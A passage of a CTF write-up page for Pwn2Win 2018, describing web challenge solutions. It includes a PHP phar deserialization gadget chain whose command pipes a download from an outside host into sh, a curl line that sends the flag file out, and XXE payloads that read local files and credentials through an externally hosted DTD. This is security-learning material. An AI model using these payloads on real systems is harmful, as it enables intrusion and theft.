@@ -1,0 +1,656 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Pwn2Win CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#back-to-bletchley-park">back-to-bletchley-park</a>
+    
+                <a class="dropdown-item" href="#gcm">gcm</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#berg’s-club">berg’s-club</a>
+    
+                <a class="dropdown-item" href="#message-board-i-(file-inclusion)">message-board-i-(file-inclusion)</a>
+    
+                <a class="dropdown-item" href="#message-board-ii-(rce)">message-board-ii-(rce)</a>
+    
+                <a class="dropdown-item" href="#message-board-iii-(log-server-rce)">message-board-iii-(log-server-rce)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                exploit
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#minishell">minishell</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#back-to-bletchley-park" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">back-to-bletchley-park</span>
+            </a>
+    
+<a href="#gcm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">gcm</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#berg’s-club" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">berg’s-club</span>
+            </a>
+    
+<a href="#message-board-i-(file-inclusion)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">message-board-i-(file-inclusion)</span>
+            </a>
+    
+<a href="#message-board-ii-(rce)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">message-board-ii-(rce)</span>
+            </a>
+    
+<a href="#message-board-iii-(log-server-rce)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">message-board-iii-(log-server-rce)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">exploit</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#minishell" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">minishell</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="pwn2win-ctf-2018"><a class="header-link" href="#pwn2win-ctf-2018"></a>Pwn2Win CTF 2018</h1>
+
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="back-to-bletchley-park"><a class="header-link" href="#back-to-bletchley-park"></a>Back to Bletchley Park</h3>
+<p>sasdf</p>
+<p><a href="https://sasdf.cf/ctf/writeup/2018/pwn2win/rev/back_to_bletchley_park/">https://sasdf.cf/ctf/writeup/2018/pwn2win/rev/back_to_bletchley_park/</a></p>
+<h3 id="gcm"><a class="header-link" href="#gcm"></a>GCM</h3>
+<p>sasdf</p>
+<p><a href="https://sasdf.cf/ctf/writeup/2018/pwn2win/crypto/GCM/">https://sasdf.cf/ctf/writeup/2018/pwn2win/crypto/GCM/</a></p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="berg’s-club"><a class="header-link" href="#berg’s-club"></a>Berg’s Club</h3>
+<p>bookgin</p>
+<p>In this challenge, we can upload a JPEG image to the server. We can also check the log page but it will return <code>monolog</code> is not prepared. Additionally, we can share this image to others. The share feature will check if the image exists or not. For instance:</p>
+<pre class="hljs"><code><span class="hljs-meta"># no <span class="hljs-meta-keyword">error</span></span>
+http:<span class="hljs-comment">//200.136.252.42/share/uploads%2Fb7a41ed641bf590cec346e0bdede04a8.jpg</span>
+
+<span class="hljs-meta"># return <span class="hljs-meta-keyword">error</span></span>
+http:<span class="hljs-comment">//200.136.252.42/share/uploads%2Faaaaa</span>
+
+<span class="hljs-meta"># no <span class="hljs-meta-keyword">error</span></span>
+http:<span class="hljs-comment">//200.136.252.42/share/%2fetc%2fpasswd</span></code></pre><h4 id="identify-the-function"><a class="header-link" href="#identify-the-function"></a>Identify The Function</h4>
+<p>But one thing is interesting: it does not return an error if it&#39;s a directory:</p>
+<pre class="hljs"><code><span class="hljs-meta"># no <span class="hljs-meta-keyword">error</span></span>
+http:<span class="hljs-comment">//200.136.252.42/share/uploads</span></code></pre><p>Since we know the backend is PHP, we can try to profile the function. I guess is <code>file_exists</code> because of this bahavior below. The results from server side are exactly the same as <code>file_exists</code>.</p>
+<pre class="hljs"><code>php &gt; var_dump(<span class="hljs-name">file_exists</span>('/home/ubuntu/../ubuntu/../ubuntu'))<span class="hljs-comment">;</span>
+bool(<span class="hljs-name">true</span>)
+php &gt; var_dump(<span class="hljs-name">file_exists</span>('/home/ubuntu/../aaaaubuntu/../ubuntu'))<span class="hljs-comment">;</span>
+bool(<span class="hljs-name">false</span>)</code></pre><h4 id="rce"><a class="header-link" href="#rce"></a>RCE</h4>
+<p>Ok, so we can upload an image, and the server side will use <code>file_exist</code> to check. How can we RCE?</p>
+<p>Although we cannot simply upload a webshell, we are able to upload an image with almost arbitrary content. If we can deserialize this file, it&#39;s possible to get RCE. But how can we leverage <code>file_exist</code> to deserialize the image?</p>
+<p>Here is a good example: how an innocuous <code>getimagesize()</code> function turns into <a href="https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html">RCE</a>. Also, one of <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Orange Tsai&#39;s challenge</a> in HITCON 2017 is also about unsafe <code>phar://</code> deserialization. Some even list several other <a href="https://rdot.org/forum/showthread.php?t=4379">exploitable function</a> in PHP.</p>
+<p>Therefore, the exploitation is invoking <code>file_exists(&quot;phar://EVIL_IMAGE_PATH&quot;)</code>. We use <a href="https://github.com/ambionics/phpggc">PHPGGC</a> to create a Generic Gadget Chains. Since the server leaks the information of using monolog in the log tab, we use <code>Monolog/RCE1</code> payload here.</p>
+<p>Modify <code>gadgetchains/Monolog/RCE/1/chain.php</code> because the file has to be JPEG image:</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Monolog</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RCE1</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">RCE</span>
+</span>{
+    <span class="hljs-keyword">public</span> $version = <span class="hljs-string">'1.18 &lt;= 1.23'</span>;
+    <span class="hljs-keyword">public</span> $vector = <span class="hljs-string">'__destruct'</span>;
+    <span class="hljs-keyword">public</span> $author = <span class="hljs-string">'cf'</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span><span class="hljs-params">(array $parameters)</span>
+    </span>{   
+        $a = <span class="hljs-keyword">new</span> \Monolog\Handler\SyslogUdpHandler(
+            <span class="hljs-keyword">new</span> \Monolog\Handler\BufferHandler(
+                [<span class="hljs-string">'current'</span>, <span class="hljs-string">'system'</span>],
+                [<span class="hljs-string">'curl "240.240.240.240:1234" | sh'</span>, <span class="hljs-string">'level'</span> =&gt; <span class="hljs-keyword">null</span>]
+            )
+        );
+        unlink(<span class="hljs-string">'pwn.phar'</span>);
+        $p = <span class="hljs-keyword">new</span> \Phar(<span class="hljs-string">'pwn.phar'</span>, <span class="hljs-number">0</span>); 
+        $p[<span class="hljs-string">'file.txt'</span>] = <span class="hljs-string">'test'</span>;
+        $p-&gt;setMetadata($a);
+        $p-&gt;setStub(<span class="hljs-string">"\xff\xd8\xff\xe0\x0a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);
+        <span class="hljs-keyword">return</span> $a; 
+    }   
+}</code></pre><p>Upload this JPEG image and get RCE by visiting <code>http://200.136.252.42/share/pher%3a%2f%2fIMAGE_PATH</code>.</p>
+<p>The remote server&#39;s <code>nc</code> doesn&#39;t work so I have to use <code>curl</code> to get the flag:</p>
+<pre class="hljs"><code><span class="hljs-attribute">curl</span> <span class="hljs-number">240.240.240.240:12345</span> -F <span class="hljs-string">"a=`cat /flag/flag 2&gt;&amp;1`"</span></code></pre><h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>Upload a webshell via image uploading API<ul class="list">
+<li>The server will rename the file, and it will also check the content to make sure it&#39;s JPG.</li>
+</ul>
+</li>
+<li>Exploit <code>getimagesize()</code>?<ul class="list">
+<li>If the server uses <code>getimagesize()</code> we can also inject <code>phar://IMAGE_PATH</code> to trigger the deserialization and RCE. Refer to <a href="https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html">this</a>. However I didn&#39;t try that because I have more confidence the server is using <code>file_exists</code> in the share API.</li>
+</ul>
+</li>
+</ul>
+<h3 id="message-board-i-(file-inclusion)"><a class="header-link" href="#message-board-i-(file-inclusion)"></a>Message Board I (File Inclusion)</h3>
+<p>This challenge consists of 3 flags. We need file inclusion to get the first flag.</p>
+<p>In this challenge, we can create/delete/read a message using JSON format. There are already 3 notes in the server. They are related to XML ,gopher protocol and json respectively. It seems like a hint.</p>
+<h4 id="information-leak"><a class="header-link" href="#information-leak"></a>Information Leak</h4>
+<p>Let&#39;s first try to add a message but it&#39;s not a valid JSON format. We get this juicy error information (some are omitted):</p>
+<pre class="hljs"><code>javax<span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.ServletException</span>: Servlet execution threw an exception
+java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Error</span>: Error: could not match <span class="hljs-selector-tag">input</span> com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonLexer</span><span class="hljs-selector-class">.zzScanError</span>(JsonLexer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">491</span>)
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonLexer</span><span class="hljs-selector-class">.yylex</span>(JsonLexer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">736</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonXmlStreamReader</span><span class="hljs-selector-class">.nextToken</span>(JsonXmlStreamReader<span class="hljs-selector-class">.java</span>:<span class="hljs-number">160</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonXmlStreamReader</span><span class="hljs-selector-class">.readNext</span>(JsonXmlStreamReader<span class="hljs-selector-class">.java</span>:<span class="hljs-number">187</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonXmlStreamReader</span><span class="hljs-selector-class">.readNext</span>(JsonXmlStreamReader<span class="hljs-selector-class">.java</span>:<span class="hljs-number">178</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.reader</span><span class="hljs-selector-class">.JsonXmlStreamReader</span><span class="hljs-selector-class">.next</span>(JsonXmlStreamReader<span class="hljs-selector-class">.java</span>:<span class="hljs-number">448</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.bind</span><span class="hljs-selector-class">.v2</span><span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.unmarshaller</span><span class="hljs-selector-class">.StAXStreamConnector</span><span class="hljs-selector-class">.bridge</span>(StAXStreamConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">197</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.bind</span><span class="hljs-selector-class">.v2</span><span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.unmarshaller</span><span class="hljs-selector-class">.UnmarshallerImpl</span><span class="hljs-selector-class">.unmarshal0</span>(UnmarshallerImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">366</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.bind</span><span class="hljs-selector-class">.v2</span><span class="hljs-selector-class">.runtime</span><span class="hljs-selector-class">.unmarshaller</span><span class="hljs-selector-class">.UnmarshallerImpl</span><span class="hljs-selector-class">.unmarshal</span>(UnmarshallerImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">345</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.BaseJSONUnmarshaller</span><span class="hljs-selector-class">.unmarshalJAXBElementFromJSON</span>(BaseJSONUnmarshaller<span class="hljs-selector-class">.java</span>:<span class="hljs-number">108</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.BaseJSONUnmarshaller</span><span class="hljs-selector-class">.unmarshalFromJSON</span>(BaseJSONUnmarshaller<span class="hljs-selector-class">.java</span>:<span class="hljs-number">97</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.json</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.provider</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.JSONRootElementProvider</span><span class="hljs-selector-class">.readFrom</span>(JSONRootElementProvider<span class="hljs-selector-class">.java</span>:<span class="hljs-number">125</span>) 
+com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jersey</span><span class="hljs-selector-class">.spi</span><span class="hljs-selector-class">.container</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.ServletContainer</span><span class="hljs-selector-class">.service</span>(ServletContainer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">699</span>) 
+
+...
+
+javax<span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.HttpServlet</span><span class="hljs-selector-class">.service</span>(HttpServlet<span class="hljs-selector-class">.java</span>:<span class="hljs-number">717</span>)</code></pre><p>The footer in the error page and the header of the server indicate the backend is <code>Apache Tomcat/6.0.26</code> + <code>Apache-Coyote/1.1</code>. The server uses <code>jersey</code> library to parse JSON. However, the class is named <code>JsonXmlStreamReader</code>. </p>
+<p>We know that in XML, there is a notorious vulnerability called <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE">XXE</a>_Processing). Maybe it&#39;s possible to include external entity in JSON?</p>
+<p>After some Google, I found <a href="http://jersey.576304.n2.nabble.com/JSON-Unmarshalling-Issue-td3012889.html">this post from 2009</a>. I seems like the library will parse <code>$</code> and <code>@</code> symbol. You may refer to this <a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">CVE</a> exploiting this. </p>
+<p>In the <a href="https://github.com/jersey/jersey-old/blob/master/jersey-json/src/main/java/com/sun/jersey/json/impl/reader/JsonXmlStreamReader.java#L232-L255">source code</a>, the symbols indeed have special meanings in the library. However I didn&#39;t dive into this too deep.</p>
+<h4 id="xml-or-json?"><a class="header-link" href="#xml-or-json?"></a>XML or JSON?</h4>
+<p>Then I build the jersey server from <a href="https://www.javainterviewpoint.com/json-example-jersey-jackson/">this example</a> to test the parser myself. In the example above, the <code>application/json</code> header needs to be explicitly set. I start to wonder what if I set to other type? And bingo! It works! The server will parse the request body according to the <code>content-type</code> header.</p>
+<pre class="hljs"><code>curl -X PUT <span class="hljs-string">'10.133.70.7:8080/rest/messages'</span> -H <span class="hljs-string">'Content-Type: application/xml; charset=utf-8'</span> <span class="hljs-_">-d</span> @mar2.xml <span class="hljs-_">-s</span>D -</code></pre><pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> standalone=<span class="hljs-string">"yes"</span><span class="hljs-meta">?&gt;</span></span>                                                                
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>msg<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xml<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre><p>Therefore that&#39;s try XXE:</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> standalone=<span class="hljs-string">"yes"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</span>                                                             
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xml<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre><p>Note that XXE can also be used to list directory! <code>&lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;]</code> will list all the file and directory on the root. The flag is in <code>/flag/flag</code>. <code>CTF-BR{TYPE_CONFUSION_ON_APIS_ARE_LOVELY_WITH_XXE_DONT_U_THINK??}</code>.</p>
+<p>I think this is intended solution due to type confusion. It might also be possible to exploit the JSON parser (e.g. <a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">CVE-2017-7525</a>).</p>
+<p>Reference:</p>
+<ul class="list">
+<li><a href="https://sleeplessinslc.blogspot.com/2010/09/xml-injection.html">Sleepless in Salt Lake City: XML Injection</a></li>
+<li><a href="https://xmlwriter.net/xml_guide/entity_declaration.shtml">XML guide</a></li>
+</ul>
+<h3 id="message-board-ii-(rce)"><a class="header-link" href="#message-board-ii-(rce)"></a>Message Board II (RCE)</h3>
+<p>bookgin
+Special thanks to the author <a href="https://github.com/pimps/">@pimps</a>!</p>
+<p>In the first stage, we can list the file in the root. There is a file named <code>root_pwd.txt</code>:<code>RCE_TO_PWN_ME</code>. Thus, in this stage we have to get shell and get root!</p>
+<h4 id="tomcat-manager"><a class="header-link" href="#tomcat-manager"></a>Tomcat Manager</h4>
+<p>The only ability currently we have is file inclusion. However, since XXE includes the file in XML, the whole xml has to be parsed to XML correctly. Otherwise it will return an error. For example, we cannot read html, xml or most binary file. They will break the whole XML structure.</p>
+<p>In <code>/etc/passwd</code> we found the home directory of Apache tomcat 6.0 is in <code>/opt/tomcat</code>. In the directory and we found: the <code>manager</code> directory. That means we might be able to access <a href="https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html">Apache Tomcat manager</a> interface. However, we got 403 forbidden visiting <code>/manager</code> because apprarently the server only accepts connection from localhost.</p>
+<p>Don&#39;t forget the XXE support other protocols like HTTP and gopher (because of the hint in the message). Let&#39;s try to make a request from localhost and access the manager API.</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> standalone=<span class="hljs-string">"yes"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://localhost:8080/manager/list"&gt;]&gt;</span>                                                             
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xml<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre><p>Unfortunately we still got an error. It&#39;s because the web interface is protected by HTTP basic authentication. However, in this JAVA XXE, the HTTP protocol does not implement HTTP basic authentication. We cannot use <code>admin:password@localhost:8080</code> syntax to login. - We have to utilize gopher protocol!</p>
+<p>Let&#39;s get the password first. The password is in <code>/opt/tomcat/conf/tomcat-users.xml</code>. However we cannot directly read this file because it will break the xml parser. We have to use <a href="https://blog.zsec.uk/out-of-band-xxe-2/">some clever technique</a> to bypass this limitation - out-of-band.</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> <span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a [
+&lt;!ENTITY % asd SYSTEM "http://240.240.240.240:8080/xxe_file.dtd"&gt;
+%asd;
+%c;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>&amp;rrr;<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xml<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code></pre><p><code>xxe_file.dtd</code>:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">d</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">opt</span>/<span class="hljs-attr">tomcat</span>/<span class="hljs-attr">conf</span>/<span class="hljs-attr">tomcat-users.xml</span>"&gt;</span>
